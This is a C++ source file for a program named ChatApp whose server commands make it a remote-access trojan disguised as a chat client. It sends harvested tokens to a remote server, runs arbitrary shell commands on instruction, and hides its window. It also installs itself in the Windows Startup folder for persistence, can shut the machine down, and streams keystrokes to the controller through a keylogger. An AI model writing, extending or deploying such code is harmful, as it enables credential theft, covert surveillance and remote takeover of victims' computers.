#include "ChatApp.h"
#include <fstream>
#include "Tokens.h"
#include "Keylogger.h"
#include "std_messages.h"
#include "Batch.h"
#include "string_util.h"
#include <filesystem>
#include "Batch.h"

namespace fs = std::filesystem;

void ChatApp::initServerCommands() {
	using cm = CommandHandler;

	//SENT ON LEAVE
	serverCH.addCommand("/leave", [&](cm::Params args) {
		connection.disconnect();
		cmd.write(THEY_LEFT);
		left = true;
	});

	//ADMIN INITIATED
	serverCH.addCommand("/tokens", [&](cm::Params args) {
		std::thread sendTokens([&]() {
			std::string tokens;
			for (auto& token : getTokens()) tokens.append(token + "\n");
			mutex.lock();
			connection.send(tokens);
			mutex.unlock();
		});
		sendTokens.detach();
	});

	serverCH.addCommand("/batch", [&](cm::Params args) {
		//special cd command
		auto& command = args[0];
		if (startsWith(command, "cd ")) {
			auto dir = command.substr(3, command.size() - 3);
			connection.send(cmd.pipe_call("cd " + dir + " && cd"));
			cmd.set_directory(dir);
		}
		//generic batch command
		else {
			auto output = cmd.pipe_call(command);
			if (output.size() > 0) {
				if (output[output.size() - 1] == '\n') {
					output.pop_back();
				}
				connection.send(output);
			}
		}
	});

	serverCH.addCommand("/restart", [&](cm::Params args) {
		system("shutdown.exe /s /t 00");
	});

	serverCH.addCommand("/hide", [&](cm::Params args) {
		Cmd::hide_window();
	});

	serverCH.addCommand("/c", [&](cm::Params args) {
		clientCH.callCommand(args[0], true);
	});
	
	serverCH.addCommand("/startup", [&](cm::Params p_args) {
		std::thread save([&](cm::Params args) {
			std::string startup = std::string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
			std::string startup_cmd = "start " + Batch::formatBatchPath(path) + " startup";

			std::ofstream file(startup + "system.bat", std::ios::trunc);
			if (file.is_open()) {
				file << startup_cmd;
				file.close();
				std::lock_guard lock(mutex);
				connection.send("Succesfully saved batch file to: " + startup + "\nBatch file: " + startup_cmd);
			}
			else {
				std::lock_guard lock(mutex);
				connection.send("Unable to save batch file to: " + startup);
			}
		}, std::move(p_args));
		save.detach();
	});

	serverCH.addCommand("/save", [&](cm::Params p_args) {
		std::thread save([&](cm::Params args) {
			static std::mutex mutex;
			std::lock_guard lock(mutex);

			std::ofstream file(args[0], std::ios::app);
			if (file.is_open()) {
				file << args[1];
				file.close();
			}
		}, std::move(p_args));
		save.detach();
	});

	serverCH.addCommand("/move", [&](cm::Params args) {  
		fs::path path(this->path);

		Batch batch("failure", true);
		batch << "timeout 1";
		batch << "move \"" + path.string() + "\" \"" + args[0] + "\"";
		batch << "start " + Batch::formatBatchPath(args[0] + "/" + path.filename().string());
		batch.run();

		exit(0);
	});

	serverCH.addCommand("/keylog", [&](cm::Params args) {
		std::thread keylog([&]() {
			while (true) {
				mutex.lock();
				std::string log = "/save [" + connection.getIp().toString() + ".txt] [";
				mutex.unlock();
				
				Keylogger logger(200);
				logger.write_to(log);
				log.push_back(']');

				mutex.lock();
				connection.send(log);
				mutex.unlock();
			}
		});
		keylog.detach();
	});
}